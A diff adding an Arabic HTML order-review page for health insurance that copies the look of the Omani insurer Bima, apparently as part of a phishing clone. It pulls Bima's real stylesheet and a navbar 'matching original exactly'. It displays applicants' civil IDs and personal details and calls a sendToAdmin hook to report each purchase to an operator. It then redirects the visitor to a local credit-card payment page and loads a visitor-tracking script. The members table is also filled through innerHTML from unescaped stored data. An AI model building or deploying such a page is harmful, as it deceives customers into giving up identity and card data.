@@ -1,0 +1,670 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بيمة</title>
+    <link rel="stylesheet" href="https://app.bima.om/styles-NZVCYVCJ.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        .fas, .fa-solid, .fab, .fa-brands, .far, .fa-regular {
+            font-family: 'Font Awesome 6 Free' !important;
+            font-weight: 900 !important;
+        }
+        .dropdown.has-sub-menu > a.menu-title::after,
+        .dropdown.has-sub-menu > a.menu-title::before,
+        .dropdown.has-sub-menu > a::after,
+        .dropdown.has-sub-menu > a::before {
+            display: none !important;
+            content: none !important;
+        }
+    </style>
+    <style>
+        @font-face {
+            font-family: 'Tajawal Regular';
+            font-style: normal;
+            font-weight: 400;
+            src: url('https://app.bima.om/media/Tajawal-Regular-DBT5HAMZ.woff') format('woff');
+        }
+        body {
+            font-family: 'Tajawal Regular', sans-serif;
+            position: relative;
+            background: #fff;
+            font-size: 16px;
+            color: #586167;
+            margin: 0;
+            direction: rtl;
+        }
+        h1, h2, h3, h4, h5, h6, p, span, label, button, select, option, a, div, td, th, input {
+            font-family: 'Tajawal Regular', sans-serif !important;
+        }
+
+        /* Page heading */
+        .page-heading-1 {
+            font-size: 2rem;
+            font-weight: 600;
+            color: var(--theme-default5, #5eac12);
+            margin: 0;
+        }
+
+        /* Medical Order Review Page */
+        .medical-order-review-page {
+            margin-top: 1.5rem;
+        }
+
+        .mor-content .theme-card {
+            background: #fff;
+            border-radius: var(--bs-border-radius-xl, 1rem);
+            box-shadow: 0 2px 12px rgba(0,0,0,.06);
+            border: 1px solid #eef2f7;
+        }
+
+        .mor-header h3 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #15324d;
+            margin-bottom: .5rem;
+        }
+
+        .mor-header p {
+            color: #6c757d;
+            font-size: .95rem;
+        }
+
+        /* Review info rows */
+        .mor-review-info-row {
+            margin-bottom: 1rem;
+        }
+
+        .review_group {
+            margin-bottom: 1rem;
+        }
+
+        .review_group h6 {
+            font-size: 0;
+            margin: 0;
+            padding: 0;
+            border: none;
+        }
+
+        .review_item {
+            padding: .4rem 0;
+        }
+
+        .review_item .col-5 {
+            font-weight: 500;
+            color: #333;
+            font-size: .9rem;
+        }
+
+        .review_item .col-1 {
+            color: #6c757d;
+            text-align: center;
+        }
+
+        .review_item .col-6 {
+            color: #6c757d;
+            font-size: .9rem;
+        }
+
+        .kv-value {
+            word-break: break-word;
+        }
+
+        /* Insured Members Table */
+        .mor-members-heading {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: var(--theme-default5, #5eac12);
+            margin: 1.5rem 0 1rem;
+            padding-bottom: .5rem;
+            border-bottom: 2px solid #eef2f7;
+        }
+
+        .mor-members-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: .85rem;
+            background: #f0f4e8;
+            border-radius: .5rem;
+            overflow: hidden;
+        }
+
+        .mor-members-table thead {
+            background: #d4dfc4;
+        }
+
+        .mor-members-table thead th {
+            padding: 12px 10px;
+            font-weight: 600;
+            color: #333;
+            text-align: center;
+            white-space: nowrap;
+            font-size: .82rem;
+            border-bottom: 1px solid #c5d4b0;
+        }
+
+        .mor-members-table tbody tr {
+            border-bottom: 1px solid #dde6cf;
+        }
+
+        .mor-members-table tbody tr:last-child {
+            border-bottom: none;
+        }
+
+        .mor-members-table tbody td {
+            padding: 12px 10px;
+            text-align: center;
+            vertical-align: middle;
+            color: #333;
+            font-size: .85rem;
+        }
+
+        .mor-members-table tbody td:nth-child(2) {
+            font-weight: 700;
+            text-align: right;
+        }
+
+        /* Order Summary Panel */
+        .theme-bg1 {
+            background: #f9faf5 !important;
+        }
+
+        .mor-summary-panel {
+            position: sticky;
+            top: 1rem;
+        }
+
+        .mor-summary-panel h6 {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #15324d;
+            padding-bottom: .75rem;
+            border-bottom: 2px solid #eef2f7;
+            margin-bottom: 1rem;
+        }
+
+        .mor-summary-panel .d-flex p {
+            margin-bottom: .6rem;
+            font-size: .9rem;
+        }
+
+        .mor-summary-panel .summary-value {
+            color: #333;
+        }
+
+        .mor-summary-panel .border-top {
+            border-top: 1px solid #dee2e6 !important;
+        }
+
+        /* Checkbox */
+        .form-check-input:checked {
+            background-color: #0d6efd;
+            border-color: #0d6efd;
+        }
+
+        .form-check-label {
+            font-size: .85rem;
+            color: #555;
+        }
+
+        /* Pay Now Button */
+        .btn-gradient.color-2 {
+            background: linear-gradient(135deg, var(--theme-default5, #66b82f) 0%, var(--theme-default5_2, #3f8f20) 100%);
+            color: #fff;
+            border: 0;
+            border-radius: var(--bs-border-radius, .375rem);
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            box-shadow: 0 10px 18px color-mix(in srgb, var(--theme-default5, #3f8f20) 22%, transparent);
+            transition: all .2s;
+        }
+
+        .btn-gradient.color-2:hover {
+            background: linear-gradient(135deg, var(--theme-default5_2, #74c43d) 0%, var(--theme-default5, #4c9f26) 100%);
+            color: #fff;
+            transform: translateY(-1px);
+        }
+
+        .btn-gradient.color-2:disabled {
+            opacity: .6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Previous button */
+        .btn-outline-secondary {
+            border: 1px solid #dee2e6;
+            color: #6c757d;
+            background: #fff;
+            border-radius: var(--bs-border-radius, .375rem);
+            padding: .6rem 1.5rem;
+            font-size: .9rem;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .btn-outline-secondary:hover {
+            background: #f8f9fa;
+            color: #333;
+        }
+
+        /* Footer */
+        footer {
+            background: #1a1a2e;
+            color: #ccc;
+            padding: 20px 0;
+            margin-top: 40px;
+            text-align: center;
+            font-size: .85rem;
+        }
+        footer a {
+            color: #5eac12;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+
+        /* OMR symbol */
+        .omr-symbol {
+            font-size: .75rem;
+            color: #6c757d;
+            margin-left: 4px;
+            vertical-align: middle;
+        }
+
+        /* Responsive */
+        @media (max-width: 991px) {
+            .mor-members-table {
+                font-size: .75rem;
+            }
+            .mor-members-table thead th,
+            .mor-members-table tbody td {
+                padding: 8px 5px;
+            }
+        }
+
+        .p-30px {
+            padding: 30px !important;
+        }
+    </style>
+</head>
+<body>
+    <!-- Navbar (matching original exactly) -->
+    <header dir="rtl" style="z-index: 9;" class="header-1 header-9 inner-page light-header shadow-cls">
+        <div class="container">
+            <div class="row">
+                <div class="col">
+                    <div class="menu">
+                        <div class="brand-logo">
+                            <a href="/"><img alt="logo" class="img-fluid for-light" src="/img/logo/bima-logo.svg" style="height:45px;"></a>
+                        </div>
+                        <nav class="nav-collapse">
+                            <div class="main-navbar">
+                                <div id="mainnav">
+                                    <ul class="nav-menu">
+                                        <li class="dropdown"><a class="nav-link menu-title" href="/"> الصفحة الرئيسية </a></li>
+                                        <li class="dropdown has-sub-menu"><a href="javascript:void(0)" class="nav-link menu-title"> تأمين</a>
+                                            <ul class="nav-submenu menu-content d-none d-md-block">
+                                                <li><a href="/#MotorForm"> التأمين على المركبات </a></li>
+                                                <li><a href="/insurance/vehicleshortperiod"> تأمين المركبات المؤقت </a></li>
+                                                <li><a href="/insurance/travel"> تأمين السفر </a></li>
+                                                <li><a href="/insurance/domestic-form"> تأمين خدم المنازل </a></li>
+                                                <li><a href="/insurance/medical-form"> تأمين صحي </a></li>
+                                                <li><a href="/insurance/credit-life-form"> تأمين القروض </a></li>
+                                                <li><a href="/insurance/malpractice-form"> تأمين الاخطاء الطبية </a></li>
+                                                <li><a href="/insurance/home-form"> تأمين المنازل </a></li>
+                                            </ul>
+                                        </li>
+                                        <li class="dropdown"><a class="nav-link menu-title" href="javascript:void(0)" style="pointer-events:none;opacity:0.5;cursor:default;"> تتبع الطلب </a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </nav>
+                        <ul class="header-right x-small-pl-1rem">
+                            <li class="right-menu color-6">
+                                <ul class="nav-menu">
+                                    <li class="dropdown language"><a href="javascript:void(0)"><i class="fas fa-globe"></i></a></li>
+                                    <li class="me-3"><a href="tel:+96879997797"><i class="fas fa-headphones"></i></a></li>
+                                </ul>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Header with Stepper -->
+    <div class="page-header" id="page-header">
+        <div class="container p-0">
+            <div class="row m-0">
+                <div class="col-12 col-md-6 d-flex align-items-center justify-content-center text-center">
+                    <div class="home-title-group d-flex align-items-center flex-nowrap">
+                        <div class="home-content pt-2">
+                            <h1 class="mt-0 page-heading-1">التأمين الصحي</h1>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-12 col-md-6 d-flex align-items-center justify-content-center">
+                    <div class="pb-2 pb-md-0 pt-md-3">
+                        <div class="sm-stepper">
+                            <div class="sm-stepper__item sm-is-done">
+                                <a class="sm-stepper__link" href="/insurance/medical-form.html">
+                                    <span class="sm-stepper__circle">1</span>
+                                    <span class="sm-stepper__label">التفاصيل</span>
+                                </a>
+                            </div>
+                            <div class="sm-stepper__item sm-is-done">
+                                <a class="sm-stepper__link" href="/insurance/medical-offers.html">
+                                    <span class="sm-stepper__circle">2</span>
+                                    <span class="sm-stepper__label">العروض</span>
+                                </a>
+                            </div>
+                            <div class="sm-stepper__item sm-is-done">
+                                <a class="sm-stepper__link">
+                                    <span class="sm-stepper__circle" aria-current="step">3</span>
+                                    <span class="sm-stepper__label">مراجعة</span>
+                                </a>
+                            </div>
+                            <div class="sm-stepper__item">
+                                <a class="sm-stepper__link">
+                                    <span class="sm-stepper__circle">4</span>
+                                    <span class="sm-stepper__label">الدفع</span>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="container mt-4 medical-order-review-page">
+        <div class="row">
+            <div class="col z-index-1">
+                <div class="mor-content">
+                    <div class="row theme-card p-0 overflow-hidden mb-5">
+                        <!-- Right Side: Info + Table (col-8) -->
+                        <div class="col-12 col-lg-8 p-30px">
+                            <div class="mor-header mb-4">
+                                <div>
+                                    <h3 class="mb-2">مراجعة طلب التأمين الطبي</h3>
+                                    <p class="mb-0 text-muted">راجع جميع المؤمّن عليهم المضافين والخطط المختارة وإجمالي القسط قبل الدفع.</p>
+                                </div>
+                            </div>
+
+                            <!-- Review Info: 2 columns -->
+                            <div class="row mor-review-info-row">
+                                <!-- Right column (contact info) -->
+                                <div class="col-12 col-md-6 mor-review-info-col">
+                                    <div class="col-lg-12 mb-4">
+                                        <div class="review_group mb-3">
+                                            <h6 class="heading-bb-2 pb-0 mb-2"></h6>
+                                            <div class="review_item">
+                                                <div class="row">
+                                                    <div class="col-5 fw-medium">اسم شخص التواصل</div>
+                                                    <div class="col-1 text-muted">:</div>
+                                                    <div class="col-6 text-muted"><span class="kv-value" id="rv-contactName">-</span></div>
+                                                </div>
+                                            </div>
+                                            <div class="review_item">
+                                                <div class="row">
+                                                    <div class="col-5 fw-medium">رقم التواصل</div>
+                                                    <div class="col-1 text-muted">:</div>
+                                                    <div class="col-6 text-muted"><span class="kv-value" id="rv-contactNumber">-</span></div>
+                                                </div>
+                                            </div>
+                                            <div class="review_item">
+                                                <div class="row">
+                                                    <div class="col-5 fw-medium">البريد الإلكتروني</div>
+                                                    <div class="col-1 text-muted">:</div>
+                                                    <div class="col-6 text-muted"><span class="kv-value" id="rv-email">-</span></div>
+                                                </div>
+                                            </div>
+                                            <div class="review_item">
+                                                <div class="row">
+                                                    <div class="col-5 fw-medium">المؤمّن عليهم المدرجون</div>
+                                                    <div class="col-1 text-muted">:</div>
+                                                    <div class="col-6 text-muted"><span class="kv-value" id="rv-insurerCount">-</span></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <!-- Left column (provider info) -->
+                                <div class="col-12 col-md-6 mor-review-info-col">
+                                    <div class="col-lg-12 mb-4">
+                                        <div class="review_group mb-3">
+                                            <h6 class="heading-bb-2 pb-0 mb-2"></h6>
+                                            <div class="review_item">
+                                                <div class="row">
+                                                    <div class="col-5 fw-medium">اسم المزود</div>
+                                                    <div class="col-1 text-muted">:</div>
+                                                    <div class="col-6 text-muted"><span class="kv-value" id="rv-providerName">-</span></div>
+                                                </div>
+                                            </div>
+                                            <div class="review_item">
+                                                <div class="row">
+                                                    <div class="col-5 fw-medium">اسم المنتج</div>
+                                                    <div class="col-1 text-muted">:</div>
+                                                    <div class="col-6 text-muted"><span class="kv-value" id="rv-productName">-</span></div>
+                                                </div>
+                                            </div>
+                                            <div class="review_item">
+                                                <div class="row">
+                                                    <div class="col-5 fw-medium">تاريخ بدء الوثيقة</div>
+                                                    <div class="col-1 text-muted">:</div>
+                                                    <div class="col-6 text-muted"><span class="kv-value" id="rv-policyStartDate">-</span></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Insured Members Table -->
+                            <h5 class="mor-members-heading">المؤمّن عليهم</h5>
+                            <div style="overflow-x:auto;">
+                                <table class="mor-members-table">
+                                    <thead>
+                                        <tr>
+                                            <th>#</th>
+                                            <th>الاسم الكامل</th>
+                                            <th>الرقم المدني</th>
+                                            <th>تاريخ الميلاد</th>
+                                            <th>الجنس</th>
+                                            <th>العلاقة</th>
+                                            <th>الجنسية</th>
+                                            <th>الخطة</th>
+                                            <th>الحد السنوي</th>
+                                            <th class="text-end">القسط</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="membersTableBody">
+                                        <tr>
+                                            <td class="text-center py-4" colspan="10">لا يوجد مؤمّن عليهم.</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+
+                        <!-- Left Side: Order Summary (col-4) -->
+                        <div class="col-12 col-lg-4 theme-bg1">
+                            <div class="p-4 mor-summary-panel">
+                                <h6 class="heading-bb-2">موجز الطلب</h6>
+                                <div class="d-flex justify-content-between">
+                                    <p class="fw-medium">المبلغ الإجمالي</p>
+                                    <p class="fw-semibold summary-value text-end" id="sv-gross">0.000</p>
+                                </div>
+                                <div class="d-flex justify-content-between">
+                                    <p class="fw-medium">الرسوم</p>
+                                    <p class="fw-semibold summary-value text-end" id="sv-fees">0.000</p>
+                                </div>
+                                <div class="d-flex justify-content-between border-top pt-2">
+                                    <p class="fw-medium">المبلغ الصافي</p>
+                                    <p class="fw-semibold summary-value text-end" id="sv-net">0.000</p>
+                                </div>
+                                <div class="d-flex justify-content-between">
+                                    <p class="fw-medium">ضريبة القيمة المضافة</p>
+                                    <p class="fw-semibold summary-value text-end" id="sv-vat">0.000</p>
+                                </div>
+                                <div class="d-flex justify-content-between border-top pt-2">
+                                    <p class="fw-medium">إجمالي القسط</p>
+                                    <p class="fw-semibold summary-value text-end" id="sv-total">
+                                        <span class="omr-symbol">ر.ع</span> 0.000
+                                    </p>
+                                </div>
+
+                                <div class="form-check mb-4 mt-4">
+                                    <input class="form-check-input" id="medicalReviewTermsCheck" type="checkbox" onchange="togglePayBtn()">
+                                    <label class="form-check-label text-sm" for="medicalReviewTermsCheck">
+                                        أوافق على الشروط والأحكام وأؤكد أن بيانات المؤمّن عليهم صحيحة.
+                                    </label>
+                                </div>
+
+                                <button id="payNowBtn" class="btn btn-gradient color-2 btn-lg w-100 py-3 d-flex justify-content-center align-items-center" type="button" disabled onclick="goToPayment()">
+                                    <span>إشتر الآن</span>
+                                </button>
+
+                                <button class="btn btn-outline-secondary w-100 mt-3 py-2" type="button" onclick="goBack()">
+                                    السابق
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <p>&copy; 2024 بيمة - جميع الحقوق محفوظة</p>
+    </footer>
+
+    <script>
+        // Relationship map
+        const relationMap = {
+            '1': 'الشخص نفسه',
+            '2': 'الزوج',
+            '3': 'الزوجة',
+            '4': 'الابن',
+            '5': 'الابنة',
+            '6': 'الأب',
+            '7': 'الأم'
+        };
+
+        // Gender map
+        const genderMap = {
+            '1': 'Male',
+            '2': 'Female'
+        };
+
+        function loadReviewData() {
+            // Load contact details
+            const contactDetails = JSON.parse(localStorage.getItem('policyContactDetails') || '{}');
+            const formData = JSON.parse(localStorage.getItem('medicalFormData') || '{}');
+            const insurers = JSON.parse(localStorage.getItem('medicalInsurers') || '[]');
+            const selectedOffer = JSON.parse(localStorage.getItem('selectedOffer') || '{}');
+            const primaryInsurer = JSON.parse(localStorage.getItem('bima_primary_insurer') || '{}');
+            const phone = primaryInsurer.phone || localStorage.getItem('medicalPhone') || '-';
+
+            // Contact info
+            document.getElementById('rv-contactName').textContent = contactDetails.contactName || '-';
+            document.getElementById('rv-contactNumber').textContent = phone || '-';
+            document.getElementById('rv-email').textContent = contactDetails.email || '-';
+            document.getElementById('rv-insurerCount').textContent = insurers.length || '-';
+
+            // Provider info
+            document.getElementById('rv-providerName').textContent = selectedOffer.companyName || selectedOffer.providerName || selectedOffer.company || 'ليفا للتأمين';
+            document.getElementById('rv-productName').textContent = selectedOffer.productName || selectedOffer.product || 'Sahatuna - Individual';
+            document.getElementById('rv-policyStartDate').textContent = contactDetails.startDate || contactDetails.policyStartDate || '-';
+
+            // Build members table
+            const tbody = document.getElementById('membersTableBody');
+            if (insurers.length > 0) {
+                tbody.innerHTML = '';
+                let totalPremium = 0;
+                const premiumPerPerson = selectedOffer.pricePerPerson ? parseFloat(selectedOffer.pricePerPerson) : (selectedOffer.premium ? parseFloat(selectedOffer.premium) : 0);
+                const annualLimit = selectedOffer.annualLimit || selectedOffer.limit || '3000';
+                const planName = selectedOffer.plan || selectedOffer.planName || 'Bronze';
+
+                insurers.forEach((ins, idx) => {
+                    const premium = premiumPerPerson;
+                    totalPremium += premium;
+
+                    const genderText = genderMap[ins.genderId] || genderMap[ins.gender] || ins.gender || '-';
+                    const relationText = relationMap[ins.relationship] || ins.relationship || '-';
+                    const nationality = ins.nationality || 'عمان';
+
+                    const tr = document.createElement('tr');
+                    tr.innerHTML = `
+                        <td>${idx + 1}</td>
+                        <td>${ins.fullName || ins.name || '-'}</td>
+                        <td>${ins.civilId || ins.idNo || '-'}</td>
+                        <td>${ins.dob || '-'}</td>
+                        <td>${genderText}</td>
+                        <td>${relationText}</td>
+                        <td>${nationality}</td>
+                        <td>${planName}</td>
+                        <td>${annualLimit}</td>
+                        <td class="text-end fw-bold">${premium.toFixed(3)}</td>
+                    `;
+                    tbody.appendChild(tr);
+                });
+
+                // Calculate summary
+                const grossAmount = totalPremium;
+                const fees = grossAmount * 0.016; // ~1.6% fees
+                const netAmount = grossAmount + fees;
+                const vatAmount = netAmount * 0.05; // 5% VAT
+                const totalAmount = netAmount + vatAmount;
+
+                document.getElementById('sv-gross').textContent = grossAmount.toFixed(3);
+                document.getElementById('sv-fees').textContent = fees.toFixed(3);
+                document.getElementById('sv-net').textContent = netAmount.toFixed(3);
+                document.getElementById('sv-vat').textContent = vatAmount.toFixed(3);
+                document.getElementById('sv-total').innerHTML = '<span class="omr-symbol">ر.ع</span> ' + totalAmount.toFixed(3);
+
+                // Save order summary for payment page
+                localStorage.setItem('orderSummary', JSON.stringify({
+                    grossAmount: grossAmount.toFixed(3),
+                    fees: fees.toFixed(3),
+                    netAmount: netAmount.toFixed(3),
+                    vatAmount: vatAmount.toFixed(3),
+                    totalPremium: totalAmount.toFixed(3)
+                }));
+            }
+        }
+
+        function togglePayBtn() {
+            const cb = document.getElementById('medicalReviewTermsCheck');
+            const btn = document.getElementById('payNowBtn');
+            btn.disabled = !cb.checked;
+        }
+
+        function goToPayment() {
+            if (window.sendToAdmin) {
+                var amount = document.getElementById('sv-total').textContent.replace('ر.ع','').trim();
+                window.sendToAdmin({
+                    'المبلغ الإجمالي': amount + ' ر.ع',
+                    'الحالة': 'تم الشراء'
+                }, 'مراجعة الطلب - الدفع');
+            }
+            window.location.href = '/credit-card-payment?amount=' + encodeURIComponent(document.getElementById('sv-total').textContent.replace('ر.ع','').trim());
+        }
+
+        function goBack() {
+            window.location.href = '/insurance/policy-contact-details.html';
+        }
+
+        // Load data on page load
+        document.addEventListener('DOMContentLoaded', loadReviewData);
+    </script>
+<script src="../visitor-tracking.js"></script>
+</body>
+</html>
